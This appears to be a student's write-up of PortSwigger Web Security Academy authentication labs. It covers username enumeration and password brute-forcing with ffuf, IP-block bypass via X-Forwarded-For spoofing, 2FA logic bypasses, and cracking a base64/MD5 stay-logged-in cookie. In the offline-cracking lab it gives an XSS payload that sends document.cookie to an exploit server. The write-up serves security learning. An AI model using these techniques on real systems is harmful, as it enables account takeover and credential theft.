# Authentication

- https://portswigger.net/web-security/authentication/password-based
- https://portswigger.net/web-security/authentication/multi-factor
- https://portswigger.net/web-security/authentication/other-mechanisms

## Username enumeration via different responses

For exact examination of the differences of the requests Burp Intruder or Turbo Intruder could be used. 

But here I simply try to determine if for some username different error than 'Invalid username' is shown:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=XYZ' -fr 'Invalid username'
```

It reviels one username (`an`) with new error: 'Incorect password'. 

Now time to brute-force the password:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=an&password=FUZZ' -fr 'Incorrect'
```

And we manage to log in. Response with correct password could be found by different response size, status or regex for error.

## Username enumeration via subtly different responses

The response status never changes and the size is random, because of analitics ids that are different in every request.

Testing with this command did not return great results:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass'
```

We might try to check if the content of the error message changes, but this time check whole html block with error, to ensure we catch even small differences.

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass' -fr '<p class=is\-warning>Invalid username or password\.</p>'
```

Username found (`academico`). 

Testing worng and correct username responses in Burp Proxy and reviewing them in Comparer revieled that error for correct username was 'Invalid username or password', and for incorrect one was 'Invalid username or password.' (Space instead of dot)

Now time to brute-force the password:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=academico&password=FUZZ' -fc 200
```

Looked for different status code than 200 - because on success usually there is a redirect 3xx response - and found a matching password.

## Username enumeration via response timing

Tested making a POST login requests using Burp Interceptor with different params.

- Correct username and correct password - results in fast 302 response
- Correct username and not correct password - results with 200 and error message
- Correct username and very long not correct password - results in 200 with long delay and same error message
- Incorrect both - results in 200 with the same error message

The app probably first check the username and only if it match it checks for the password. Applying long password makes this step significantly longer.

Additionally after multiple error trials, app prevented us for further logging in for 30 minutes. No cookie was set, and the same error occured from different browser, so it may be tied up to my IP.

Adding `X-Forwarded-For: 8.8.8.8` to the request bypassed this protection, overwriting my IP with value here provided for the app.

Run the script to find the username
```
python3 username-enumeration-script-1.py
```

The script was not perfect and could be tuned better. It consistantly retuner `mysql` user for me, so I've decided its enough to go further.

Brute force the password:
```
python3 username-enumeration-script-1-password.py
```

## Broken brute-force protection, IP block

Application show different error if the username is invalid and different when password is. Username enumaration would be easy, but we have username given in the lab description: `carlos`.

After too many failed login you receive error and get blocked from logging in (even with good credentials):

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

`X-Forwarder-For` header does not help this time.

Blocking is done after exactly 3 failed login attempts, but after successful login the limit is reset. Sending 2 incorrect password, then correct one, finally allows us to make further guessing tries.

Run script:
```
python3 bypassing-brute-force-protection.py
```

## Username enumeration via account lock

Tried brute-focring username to look for different response size:
```
ffuf -X POST -u 'https://0a9800c203b320a980328fe7008e0016.web-security-academy.net/login' -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WRONGPASSWORD'
```

All of the above had response size of `3132`, so filtering that and running the command 5 more time revieled the username `apple`:

```
ffuf -X POST -u 'https://0a9800c203b320a980328fe7008e0016.web-security-academy.net/login' -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WRONGPASSWORD' -fs 3132
```

Trying to login with this username in the browser revealed the changed error:

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

Trying to bruteforce `apple` password could be possible, by waiting 1 minute after every couple of requests, but it would take too long. First I will try to check for differences on responses when username and password are correct even if the account is blocked:

```
ffuf -X POST -u 'https://0a9800c203b320a980328fe7008e0016.web-security-academy.net/login' -w portswigger-wordlists/passwords -d 'username=apple&password=FUZZ'
```

Knowing response size for known errors, flag `-fs 3184,3132` could be added. And as a result we receive the `mustang` password.

Checking this in a browser, when the correct username and password are given and we are in the 1 minute time delay, we would not be logged in, but no error would be retrived.

## 2FA simple bypass

After providing valid credentials the user is already logged in, but is at the verification code page. 

Simply changing the endpoint to `/my-account?id=[user_id]` or to `/` after providing the valid credentials lets us into the application as logged in user, bypassing 2FA.

## 2FA broken logic

Logging in requeire two POST requests to `/login` with credentials and `/login2` with MFA code. In the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.

Intercepting whole login flow, change the value of `Set-Cookie: verify=wiener` to `verify=carlos` in a resposne for `POST /login`. Then `GET /login2` is performed which ensures the MFA token is generated for `carlos`.

Now we can make and intercept a `POST /login2` request with some random value and then using `Burp Turbo Intruder` brute-force MFA token to login as carlos (looking for 302 response).

## Brute-forcing a stay-logged-in cookie

Performing successful login with stay signed in functionality returns two cookies: `session` and `stay-signed-in`.

Checking for base64 encoding:

- session cookie:

No good results

- stay-signed-in:

```
$echo -n "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Checking the `51dc30ddc473d43a6011e9ebba6ca770` value at https://crackstation.net/ revieled that this is `md5` sum for the password. So the cookie is created with pattern: `base64(username:md5(password))`

Brute force `carlos` cookie/password:
```
python brute-force-stay-signed-in-cookie.py
```

## Offline password cracking

Logged in as `wiener` and examined `stay-signed-in` cookie. Same process and results as above.

To retrieve the `carlos` cookie create a comment with body:

```
<script>
fetch("https://exploit-0a32005c03b912ba817ca75001d90043.exploit-server.net/exploit?q=" + btoa(document.cookie), {mode: 'no-cors'})
</script>
```

Then read the `Access log` from the `Exploit server` to reveal the cookie.

```
$echo -n "c2VjcmV0PXpkeW9uYnVjZjZnendBOElteDIyUWxzVzgzODVvVlhHOyBzdGF5LWxvZ2dlZC1pbj1ZMkZ5Ykc5ek9qSTJNekl6WXpFMlpEVm1OR1JoWW1abU0ySmlNVE0yWmpJME5qQmhPVFF6" | base64 -d
secret=zdyonbucf6gzwA8Imx22QlsW8385oVXG; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Examining `stay-signed-in` cookie:

Base64 decoding results in `carlos:26323c16d5f4dabff3bb136f2460a943`

Checking provided hash again in CrackStation it reviels that the password is `onceuponatime`.
